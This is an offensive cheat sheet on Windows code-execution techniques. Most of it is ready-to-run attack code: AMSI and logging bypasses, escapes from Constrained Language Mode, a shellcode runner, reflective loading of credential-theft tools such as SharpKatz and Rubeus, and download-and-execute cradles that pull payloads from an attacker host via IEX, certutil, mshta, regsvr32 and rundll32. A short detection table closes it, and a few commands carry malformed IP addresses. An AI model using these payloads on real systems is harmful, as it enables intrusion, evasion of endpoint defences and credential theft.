# Execution Methods

Techniques for executing code on Windows targets, from command-line execution to bypassing PowerShell security controls and using advanced execution methods like reflective loading and PowerSharpPack.

## AMSI Bypasses

The Anti-Malware Scan Interface (AMSI) scans PowerShell scripts, VBA macros, and other script content before execution. Bypassing AMSI is critical for running malicious PowerShell.

### Technique 1: Registry patch (amsi.dll patching)
```powershell
# Patch AMSI in memory
$Win32 = Add-Type -memberDefinition @"
[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32")]
public static extern IntPtr LoadLibrary(string name);
[DllImport("kernel32")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
"@ -name "Win32" -namespace Win32Functions -passthru
$ptr = $Win32::GetProcAddress($Win32::LoadLibrary("amsi.dll"), "AmsiScanBuffer")
$b = [byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($b, 0, $ptr, 6)
```

### Technique 2: Registry disabling
```powershell
# Disable AMSI via registry (requires admin)
Set-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\AMSI -Name Enable -Value 0 -Type DWord

# Disable AMSI per-process (no admin needed, PowerShell 5+)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

### Technique 3: AMSI bypass strings
```powershell
# Variable obfuscation
$am = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$am.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Out-null version
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# One-liner
sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2"  +"uZx"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','fa','iled'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

### Technique 4: PowerShell downgrade (no AMSI before PowerShell 5)
```powershell
# Downgrade to PowerShell 2.0 (no AMSI)
powershell -Version 2 -Command "Get-Process"

# From within PowerShell
$PSVersionTable.PSVersion
```

### Technique 5: Memory patching various AMSI functions
```powershell
# Patch AmsiOpenSession
$method = [System.Runtime.InteropServices.Marshal]
$dll = [System.Reflection.Assembly]::LoadWithPartialName("System")
$ptr = $method::GetComInterfaceForObject($dll, [System.Management.Automation.PowerShell])
# ... complex memory patching

# Using existing tools
# -amsi.fail.ps1
# -AMSI-Bypass-API.ps1
# -Invoke-ReflectivePEInjection with AMSI bypass
```

### Technique 6: Reflection + null byte insertion
```powershell
$null = [Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils').GetField('am'+'siInitFailed','NonPublic,Static').SetValue($null,$true)
```

### Technique 7: Use CLR hooks
```powershell
# Install CLR hook to disable AMSI in child processes
$code = @"
using System;
using System.Runtime.InteropServices;
public class Amsi {
    [DllImport("amsi.dll")]
    public static extern int AmsiScanBuffer(IntPtr amsi, byte[] buffer, uint length, IntPtr content, IntPtr result);
}
"@
Add-Type $code
```

---

## PowerShell Script Block Logging Bypasses

Script block logging (enabled in PowerShell 5+) logs the full content of all script blocks to Event ID 4104.

### Technique 1: Disable logging via registry
```powershell
# Disable script block logging (requires admin)
Set-ItemProperty -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging -Name EnableScriptBlockLogging -Value 0 -Type DWord

# Turn off module logging
Set-ItemProperty -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging -Name EnableModuleLogging -Value 0 -Type DWord
```

### Technique 2: In-memory patching
```powershell
# Patch event log API to prevent writing 4104 events
$log = [System.Diagnostics.EventLog]::sourceExists('PowerShell')
$type = [System.Diagnostics.Eventing.Reader.EventLogReader]
# ... complex patching

# Simpler: use Protected Event Logging bypass
[Ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static').SetValue($null,$null)
```

### Technique 3: Group Policy cache manipulation
```powershell
# Override GPO cache to disable logging at runtime
$settings = [Ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static').GetValue($null)
$settings['ScriptBlockLogging'] = @{Enabled=$false}
$settings['ProtectPSData'] = @{Enabled=$false}
```

### Technique 4: Obfuscate to bypass script block logging
```powershell
# Script block logging logs the de-obfuscated code
# Use compression + base64 + invoke-expression chain (still logged)

# Better: use split-string construction
$c = "Wr".Substring(0,1)+"ite-Hos".Substring(0,5)+"t 't".Substring(0,1)+"es".Substring(0,2)+"t'"
# Split commands, use variable substitution
iex $c
```

### Technique 5: Use Alternate PowerShell Hosts
```powershell
# PowerShell.exe hosts log; custom hosts don't (in some configurations)
# System.Management.Automation.Runspaces.Runspace via C# doesn't trigger 4104
```

---

## Constrained Language Mode Bypasses

Constrained Language Mode (CLM) restricts PowerShell to authorized cmdlets and types, blocking most offensive tools.

### Technique 1: Registry bypass (admin)
```powershell
# Find current language mode
$ExecutionContext.SessionState.LanguageMode

# Disable CLM via registry (requires admin)
Remove-ItemProperty -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell -Name ExecutionPolicy

# Set PowerShell to unrestricted
Set-ExecutionPolicy -Scope LocalMachine -ExecutionPolicy Bypass -Force
```

### Technique 2: Reflection to revert language mode
```powershell
# Attempt to revert to FullLanguage mode (often blocked)
$exec = $ExecutionContext.SessionState.LanguageMode.GetType().GetField('languageMode','Instance,NonPublic')
$exec.SetValue($ExecutionContext.SessionState.LanguageMode, 0)

# Alternative: use system.management.automation.pslanguageMode enum
$ref = [System.Management.Automation.PSLanguageMode]::FullLanguage
```

### Technique 3: Use applocker bypass
```powershell
# If CLM is enforced via AppLocker, bypass via:
# 1. Run PowerShell from SysWOW64 (32-bit)
# 2. Run unmanaged PowerShell (PowerHost)
# 3. Use C# execution via Add-Type with System.Management.Automation
```

### Technique 4: Run via alternate .NET language
```csharp
# Inline C# code (not subject to CLM for the C# portion)
Add-Type -TypeDefinition @"
using System;
using System.Management.Automation;
public class Bypass {
    public static void Run() {
        PowerShell ps = PowerShell.Create();
        ps.AddScript("whoami");
        ps.Invoke();
    }
}
"@
[Bypass]::Run()
```

### Technique 5: Use C# to create unrestricted runspace
```csharp
Add-Type @"
using System.Management.Automation;
using System.Management.Automation.Runspaces;
public class RunspaceBypass {
    public static void Run(string cmd) {
        Runspace r = RunspaceFactory.CreateRunspace();
        r.Open();
        PowerShell ps = PowerShell.Create();
        ps.Runspace = r;
        ps.AddScript(cmd);
        ps.Invoke();
    }
}
"@
[RunspaceBypass]::Run('Write-Host "FullLanguage mode"')
```

---

## Reflective Loading of .NET Assemblies

Load .NET assemblies directly into memory without writing to disk.

### System.Reflection.Assembly.Load
```powershell
# Load from byte array
$bytes = (Invoke-WebRequest -Uri 'http://10.10.10.5/SharpKatz.exe' -UseBasicParsing).Content
[System.Reflection.Assembly]::Load([byte[]]$bytes)

# Call entry point
[Reflective.Loader]::Main()

# Load from file path
[System.Reflection.Assembly]::LoadFile("C:\Temp\Rubeus.exe")

# Load from base64
$b64 = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAA..."
[System.Reflection.Assembly]::Load([Convert]::FromBase64String($b64))
```

### Reflective PE Injection
```powershell
# Using PowerSploit's Invoke-ReflectivePEInjection
IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.5/Invoke-ReflectivePEInjection.ps1')
Invoke-ReflectivePEInjection -PEBytes $bytes -ExeArgs "argument"

# Meterpreter reflective loader
# msfvenom -p windows/x64/meterpreter/reverse_http LHOST=10.10.10.5 LPORT=80 -f psh-reflection
```

### .NET assembly download cradle
```powershell
# Download and execute in memory
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.10.5/Rubeus.exe')
$ass = [System.Reflection.Assembly]::Load($data)
$ass.EntryPoint.Invoke($null, (, [string[]] ('kerberoast')))
```

---

## Execute-Assembly Techniques

Execute .NET assemblies from non-.NET payloads (Beacon, Cobalt Strike, Metasploit).

### Cobalt Strike execute-assembly
```
# From Beacon
execute-assembly /path/to/Rubeus.exe kerberoast

# Execute with arguments
execute-assembly /path/to/Seatbelt.exe -group=user

# Execute as specific user
execute-assembly /path/to/tool.exe -user DOMAIN\user
```

### Meterpreter execute-assembly
```
meterpreter > execute -H -m -d calc.exe -f Rubeus.exe -a "kerberoast"
# Or with extension
meterpreter > load incognito
meterpreter > execute-assembly /path/to/SharpHound.exe
```

### InlineExecute-Assembly (Cobalt Strike)
```
# Using InlineExecute-Assembly BOF
inlineExecute-Assembly /path/to/Rubeus.exe kerberoast /etw:false /amsi:false
```

### Manual execute-assembly (PowerShell)
```powershell
# Load .NET assembly and invoke method
$bytes = [System.IO.File]::ReadAllBytes("C:\Tools\Rubeus.exe")
[System.Reflection.Assembly]::Load($bytes)
[Rubeus.Program]::Main(@("kerberoast"))
```

---

## PowerSharpPack Usage

PowerSharpPack by @S3cur3Th1sSh1t packages common offensive .NET tools as PowerShell functions that reflectively load and execute them.

### Features
- All tools are loaded reflectively (no disk writes)
- AMSI bypass integrated
- Script block logging bypass integrated
- Tools included: Rubeus, Seatbelt, SharpUp, SharpHound, SharpView, SharpDPAPI, SharpChrome, SharpKatz, Certify, etc.

### Installation
```powershell
# Load PowerSharpPack
IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.5/PowerSharpPack.ps1')
# Or
Import-Module .\PowerSharpPack.ps1
```

### Available commands
```powershell
# Rubeus
Invoke-Rubeus -Command "kerberoast"
Invoke-Rubeus -Command "asreproast"
Invoke-Rubeus -Command "dump /service:krbtgt"
Invoke-Rubeus -Command "asktgt /user:administrator /rc4:NTLM_HASH"

# Seatbelt
Invoke-Seatbelt -Command "-group=user"
Invoke-Seatbelt -Command "-group=system"

# SharpHound
Invoke-SharpHound -Command "-c All -d domain.local"

# SharpUp
Invoke-SharpUp -Command "audit"

# Certify
Invoke-Certify -Command "find /vulnerable"
Invoke-Certify -Command "request /ca:CA-SERVER\CA-NAME /template:User"

# SharpDPAPI
Invoke-SharpDPAPI -Command "machinecredentials"

# SharpChrome
Invoke-SharpChrome -Command "logins /target:C:\Users\User\AppData"

# SharpKatz (Mimikatz in .NET)
Invoke-SharpKatz -Command "--Command logonpasswords"

# SharpView (PowerView in .NET)
Invoke-SharpView -Command "Get-NetUser"

# StandIn (AD ACL abuse)
Invoke-StandIn -Command "--help"

# Watson (Priv esc checker)
Invoke-Watson

# SharpWMI
Invoke-SharpWMI -Command "action=exec computername=target cmd=whoami"
```

### Execution flow
```
PowerShell --> PowerSharpPack.ps1 --> Reflective loading --> Tool function
                                           |
                                    [System.Reflection.Assembly]::Load
                                           |
                                    .NET tool executes in memory
                                           |
                                    Output returned to PowerShell
```

### PowerSharpPack with AMSI bypass
```powershell
# PowerSharpPack includes built-in AMSI bypass on load
# If needed, manually bypass AMSI first:
$amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Then load PowerSharpPack
IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.5/PowerSharpPack.ps1')
Invoke-Rubeus -Command "asreproast /format:hashcat /outfile:asrep.txt"
```

---

## Inline C# Execution

Execute C# code directly from PowerShell using `Add-Type`.

### Basic inline C#
```powershell
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("user32.dll")]
    public static extern int MessageBox(IntPtr hWnd, string text, string caption, uint type);
}
"@
[Win32]::MessageBox(0, "Hello from inline C#", "Test", 0)
```

### Inline C# shellcode runner
```powershell
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Runner {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    public static void Run(byte[] shellcode) {
        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
        Marshal.Copy(shellcode, 0, addr, shellcode.Length);
        CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
    }
}
"@
[Runner]::Run((byte[]) $shellcode)
```

### Inline C# PowerShell execution
```csharp
Add-Type @"
using System.Management.Automation;
public class PSRunner {
    public static string Run(string cmd) {
        using (PowerShell ps = PowerShell.Create()) {
            var results = ps.AddScript(cmd).Invoke();
            return string.Join("\n", results);
        }
    }
}
"@
[PSRunner]::Run("Get-Process | Select -First 5")
```

---

## Unmanaged PowerShell

Unmanaged PowerShell (PowerHost) runs PowerShell without `powershell.exe`, bypassing many security controls.

### Using PowerHost
```bash
# PowerHost by @p3nt4 - standalone executable
PowerHost.exe
PS C:\> whoami

# PowerHost with AMSI bypass
PowerHost.exe -amsi

# Execute script
PowerHost.exe -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.5/beacon.ps1')"
```

### Using PowerShell without powershell.exe
```csharp
// C# code to create PS host
using System.Management.Automation;
using System.Management.Automation.Runspaces;

Runspace runspace = RunspaceFactory.CreateRunspace();
runspace.Open();
PowerShell ps = PowerShell.Create();
ps.Runspace = runspace;
ps.AddScript("whoami").Invoke();
```

### Using C# to host PowerShell
```bash
# Various implementations:
# - PowerHost (standalone)
# - p0wnedShell
# - PowerShell_Sandbox_Detection/dll
# - PS2EXE (compiled PowerShell)

# Unmanaged PowerShell benefits:
# - No powershell.exe process (blends as custom app)
# - CLM bypass (not subject to AppLocker rules on powershell.exe)
# - AMSI depends on implementation (custom host may not trigger AMSI)
# - Script block logging depends on host implementation
```

---

## Various Execution Methods

### IEX download cradle
```powershell
# Standard download and execute
IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.5/script.ps1')

# Using Net.WebClient with proxy
$wc = New-Object System.Net.WebClient
$wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy()
$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials
IEX $wc.DownloadString('http://10.10.10.5/script.ps1')

# Using alternate classes
IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.10.5/a')  # HTTP
IEX (curl http://10.10.10.5/script.ps1 -UseBasicParsing).Content              # PowerShell 5+
IEX (wget http://10.10.10.5/script.ps1 -UseBasicParsing).Content              # alias
IEX (Invoke-WebRequest http://10.10.10.5/script.ps1 -UseBasicParsing).Content  # verbose

# Using XMLHttpRequest (COM)
$http = New-Object -ComObject MSXML2.XMLHTTP
$http.open("GET", "http://10.10.10.5/script.ps1", $false)
$http.send()
IEX $http.responseText

# Using WebClient with SSL bypass
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
IEX (New-Object Net.WebClient).DownloadString('https://10.10.10.5/script.ps1')
```

### Dot-source execution
```powershell
# Load script from disk (persistent module)
. .\PowerView.ps1

# Load from UNC path
. \\server\share\script.ps1

# Load from mapped drive
. Z:\tools\PowerView.ps1
```

### Add-Type compilation
```powershell
# Compile C# source at runtime
Add-Type -TypeDefinition "public class Test { public static string Run() { return \"Hello\"; } }" -Language CSharp
[Test]::Run()

# Compile from file
Add-Type -Path "C:\Source\class.cs"

# Compile with references
Add-Type -TypeDefinition "..." -ReferencedAssemblies "System.DirectoryServices.dll"
```

### Assembly::Load
```powershell
# Load .NET assembly from bytes
[System.Reflection.Assembly]::Load([byte[]]$bytes)

# Load from file
[System.Reflection.Assembly]::LoadFile("C:\Tools\Rubeus.exe")

# Load partially (in-memory assembly)
[System.Reflection.Assembly]::LoadFrom("\\server\share\SharpKatz.exe")
```

### MsBuild execution (scriptlet)
```cmd
# Execute C# code via MSBuild
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe .\payload.xml

# payload.xml format
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Build">
    <ClassExample />
  </Target>
  <UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code><![CDATA[
        System.Diagnostics.Process.Start("cmd.exe", "/c whoami");
      ]]></Code>
    </Task>
  </UsingTask>
</Project>
```

### InstallUtil execution
```cmd
# Execute via InstallUtil (LOLBAS)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U .\payload.dll
```

### regsvcs/regasm execution
```cmd
# Execute via RegSvcs/RegAsm
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe .\payload.dll
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe .\payload.dll
```

### csc compilation + execution
```cmd
# Compile and run C# in memory
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:exe /out:payload.exe C:\Temp\source.cs
.\payload.exe
```

---

## Living Off the Land Binaries (LOLBAS)

LOLBINs (Living Off the Land Binaries) are Microsoft-signed executables that can be abused for code execution, bypassing application whitelisting.

### Execution LOLBINs

| Binary | Technique | Command |
|--------|-----------|---------|
| `mshta.exe` | Execute HTA/JavaScript | `mshta.exe http://10.10.10.5/payload.hta` |
| `rundll32.exe` | Execute DLL/JavaScript | `rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://10.10.10.5/a")` |
| `regsvr32.exe` | Execute scriptlet | `regsvr32.exe /s /u /i:http://10.10.10.5/payload.sct scrobj.dll` |
| `cscript.exe` | Execute JScript/VBS | `cscript.exe //nologo payload.vbs` |
| `wscript.exe` | Execute JScript/VBS | `wscript.exe payload.vbs` |
| `msbuild.exe` | Execute C# via XML | `msbuild.exe payload.xml` |
| `installutil.exe` | Execute via installer | `InstallUtil.exe /U payload.dll` |
| `regasm.exe` | Execute via assembly reg | `regasm.exe payload.dll` |
| `regsvcs.exe` | Execute via services | `regsvcs.exe payload.dll` |
| `csc.exe` | Compile C# | `csc.exe /target:exe /out:p.exe source.cs && p.exe` |
| `jsc.exe` | Compile JScript | `jsc.exe /target:winexe payload.js` |
| `powershell.exe` | Execute PowerShell | `powershell -exec bypass -enc BASE64` |
| `pwsh.exe` | Execute PS Core | `pwsh -c "IEX(etc)"` |
| `certutil.exe` | Download + execute | `certutil -urlcache -split -f http://10.10.5/payload.exe && payload.exe` |
| `bitsadmin.exe` | Download + execute | `bitsadmin /transfer job /download /priority high http://10.10.5/payload.exe C:\temp\p.exe && p.exe` |
| `cmstp.exe` | Execute via CMSTP | `cmstp.exe /s payload.inf` |
| `mmc.exe` | Execute via MSC | `mmc.exe payload.msc` |
| `pcalua.exe` | Execute via Program Compat | `pcalua.exe -a payload.exe` |
| `wevtutil.exe` | Execute via event log | `wevtutil.exe /e:false /lf:true /fn:http://payload` |
| `syncappvpublishingserver.exe` | Execute via App-V | `SyncAppvPublishingServer.exe "n;Invoke-Expression(etc)"` |

### LOLBAS download + execute patterns
```cmd
# certutil
certutil -urlcache -split -f http://10.10.10.5/beacon.exe C:\Windows\Temp\beacon.exe
C:\Windows\Temp\beacon.exe

# bitsadmin
bitsadmin /transfer job /download /priority high http://10.10.10.5/beacon.exe C:\temp\b.exe && C:\temp\b.exe

# PowerShell
powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.5/beacon.ps1')"

# mshta (download + execute)
mshta http://10.10.10.5/payload.hta

# rundll32 (JScript download cradle)
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();o=GetObject("script:http://10.10.5/run.sct");window.close();

# regsvr32 (SCT download)
regsvr32.exe /s /u /i:http://10.10.10.5/payload.sct scrobj.dll
```

### LOLBAS execution flow
```
AppLocker allows: microsoft signed binaries
Execution via: msbuild.exe / regsvr32.exe / rundll32.exe / mshta.exe / etc.
These binaries download/execute arbitrary code
Bypasses AppLocker, WDAC (if not configured to block LOLBINs)
```

---

## Detection

| Activity | Event ID | Source |
|----------|----------|--------|
| AMSI detection | 4101 | PowerShell (AMSI triggered) |
| Script block log | 4104 | PowerShell (full script content) |
| PowerShell start | 4100/4103/400 | PowerShell |
| Module logging | 4105/4106 | PowerShell (module logging) |
| Add-Type compilation | 4688 + csc.exe | Security (csc.exe compile) |
| Reflective assembly load | 4688 + no parent | No direct detection (memory only) |
| LOLBIN execution | 4688 | Security (mshta, rundll32, etc.) |
| D/Invoke | 4688 + unusual parent | No direct detection |
| AMSI bypass attempt | 4101 suppressed | If AMSI bypassed, no 4101 |
| LoadFrom remote | 4688 + WebClient | Security (network connect) |
| MsBuild execution | 4688 | Security (MSBuild.exe) |
| Certutil download | 4688 | Security (certutil.exe) |

**Detection logic:**
- `powershell.exe` with `-enc` flag = suspicious
- Parent process of `powershell.exe` is `explorer.exe` = user-initiated (likely normal)
- Parent process is `wmiprvse.exe`, `services.exe`, `mmc.exe` = lateral movement
- `msbuild.exe` with XML file download = code execution
- `regsvr32.exe` with HTTP source = SCT download execution
- `rundll32.exe` with JavaScript parameters = LOLBIN execution
- `certutil.exe` with HTTP download = suspicious (common attacker pattern)
- Multiple reflective assembly loads in short time = PowerSharpPack
- `Add-Type` compilation of C# code = inline execution
- `csc.exe` invoked = compilation of malicious code

## References

- AMSI bypass collection: https://amsi.fail/
- PowerSharpPack: https://github.com/S3cur3Th1sSh1t/PowerSharpPack
- LOLBAS project: https://lolbas-project.github.io/
- Invoke-ReflectivePEInjection: https://github.com/PowerShellMafia/PowerSploit
- Unmanaged PowerShell: https://github.com/p3nt4/PowerSHell
- Script block logging bypass: https://posts.specterops.io/reviving-attack-techniques-from-the-script-block-logging-bypass-8cd6db9e2eab
- Constrained Language Mode bypass: https://blog.cobaltstrike.com/2019/08/28/a-guide-to-attacking-domain-trusts/
- Execute-Assembly: https://www.cobaltstrike.com/blog/execute-assembly/
- InlineExecute-Assembly: https://github.com/anthemtotheego/InlineExecute-Assembly
